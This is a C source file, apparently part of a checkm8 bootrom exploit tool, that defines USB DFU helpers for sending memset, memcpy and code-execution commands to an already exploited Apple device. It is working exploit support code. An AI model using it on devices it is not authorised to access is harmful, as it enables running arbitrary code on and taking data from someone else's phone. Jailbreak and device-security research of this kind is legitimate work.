#include "command.h"

#include "checkm8.h"
#include "libusb_helpers.h"
#include "libusb.h"

#include "stdlib.h"

void dfu_send_data(struct pwned_device *dev, unsigned char *data, long data_len)
{
    long index = 0, amount;
    while(index < data_len)
    {
        if(data_len - index >= LIBUSB_MAX_PACKET_SIZE) amount = LIBUSB_MAX_PACKET_SIZE;
        else amount = data_len - index;

        libusb_control_transfer(dev->bundle->handle, 0x21, 1, 0, 0, &data[index], amount, 5000);
        index += amount;
    }
}

static unsigned char nullbuf[16] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

struct command_args
{
    unsigned long magic;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
    unsigned long arg4;
    unsigned long arg5;
    unsigned long arg6;
    unsigned long arg7;

    long len;
};

int command(struct pwned_device *dev, struct command_args *args, struct command_args *resp, long response_len)
{
    int ret = get_device_bundle(dev);
    if(IS_CHECKM8_FAIL(ret)) return ret;

    dfu_send_data(dev, nullbuf, 16);
    libusb_control_transfer(dev->bundle->handle, 0x21, 1, 0, 0, NULL, 0, 100);
    libusb_control_transfer(dev->bundle->handle, 0xA1, 3, 0, 0, NULL, 0, 100);
    libusb_control_transfer(dev->bundle->handle, 0xA1, 3, 0, 0, NULL, 6, 100);
    dfu_send_data(dev, (unsigned char *) args, args->len);

    if(response_len == 0)
    {
        libusb_control_transfer(dev->bundle->handle, 0xA1, 2, 0xFFFF, 0, (unsigned char *) resp, response_len + 1, 100);
    }
    else
    {
        libusb_control_transfer(dev->bundle->handle, 0xA1, 2, 0xFFFF, 0, (unsigned char *) resp, response_len, 100);
    }

    release_device_bundle(dev);
    return CHECKM8_SUCCESS;
}

#define EXEC_MAGIC 0x6365786563657865ul
#define MEMC_MAGIC 0x636d656d636d656dul
#define MEMS_MAGIC 0x736d656d736d656dul
#define DONE_MAGIC 0x656e6f64656e6f64ul

int dev_memset(struct pwned_device *dev, long addr, char c, long len)
{
    int ret;
    struct command_args *cmd_args, *cmd_resp;
    cmd_args = calloc(1, sizeof(struct command_args));
    cmd_resp = calloc(1, sizeof(struct command_args));

    cmd_args->magic = MEMS_MAGIC;
    cmd_args->arg1 = addr;
    cmd_args->arg2 = (unsigned long) c;
    cmd_args->arg3 = len;
    cmd_args->len = 16;

    ret = command(dev, cmd_args, cmd_resp, 0);
    free(cmd_args);
    free(cmd_resp);

    return ret;
}

int dev_memcpy(struct pwned_device *dev, long dest, long src, long len)
{
    int ret;
    struct command_args *cmd_args, *cmd_resp;
    cmd_args = calloc(1, sizeof(struct command_args));
    cmd_resp = calloc(1, sizeof(struct command_args));

    cmd_args->magic = MEMC_MAGIC;
    cmd_args->arg1 = dest;
    cmd_args->arg2 = src;
    cmd_args->arg3 = len;
    cmd_args->len = 16;

    ret = command(dev, cmd_args, cmd_resp, 0);
    free(cmd_args);
    free(cmd_resp);

    return ret;
}

int dev_exec(struct pwned_device *dev, long response_len, int nargs, long *args)
{
    if(nargs > 7) return CHECKM8_FAIL_INVARGS;

    int ret;
    unsigned long *argbase;
    struct command_args *cmd_args, *cmd_resp;
    cmd_args = calloc(1, sizeof(struct command_args));
    cmd_resp = calloc(1, sizeof(struct command_args));

    cmd_args->magic = EXEC_MAGIC;
    argbase = &cmd_args->arg1;
    for(ret = 0; ret < nargs; ret++)
    {
        argbase[ret] = args[ret];
    }

    ret = command(dev, cmd_args, cmd_resp, 16 + response_len);
    if(cmd_resp->magic != DONE_MAGIC) return CHECKM8_FAIL_NOTDONE;
    else return ret;
}